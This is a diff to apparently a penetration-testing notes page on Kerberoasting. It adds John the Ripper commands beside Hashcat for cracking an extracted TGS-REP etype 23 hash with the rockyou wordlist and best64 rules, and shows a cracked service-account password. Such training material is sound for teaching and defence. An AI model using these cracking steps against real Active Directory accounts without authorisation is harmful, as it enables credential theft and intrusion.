@@ -125,7 +125,11 @@ If `impacket-GetUserSPNs` throws the error "`KRB_AP_ERR_SKEW(Clock skew too grea
 
 ## Cracking the Hash
 
-Once again, Hashcat will be used to crack the hash. To find the mode keep in mind that the attacker has obtained a TGS-REP with encryption type 23:
+Cracking can often be achieved with either [John The Ripper](https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/exploitation/exploit-with-account/kerberoast-attack) (JtR) or Hashcat. This is helpful because JtR has been found to generally perform better on CPUs whereas Hashcat is superior on GPUs. So depending on the attacker's system the better-suited tool can be chosen.
+
+### Hashcat
+
+Once again, Hashcat can be used to crack the hash. To find the mode keep in mind that the attacker has obtained a TGS-REP with encryption type 23:
 
 <pre class="language-shell-session"><code class="lang-shell-session"><strong>kali@kali:~$ hashcat --help | grep Kerberos
 </strong>  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
@@ -172,3 +176,21 @@ Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
 $krb5tgs$23$*iis_service$CORP.COM$HTTP/web04.corp.com*$64d1a5...b97ea6e:Strawberry1
 ```
 {% endcode %}
+
+### John The Ripper
+
+
+
+To crack the same hashes.kerberoast file with the best64 ruleset the command would be:
+
+{% code overflow="wrap" %}
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hashes.kerberoast
+```
+{% endcode %}
+
+Then the passwords can be viewed with the --show flag:
+
+```bash
+john --show hashes.kerberoast
+```
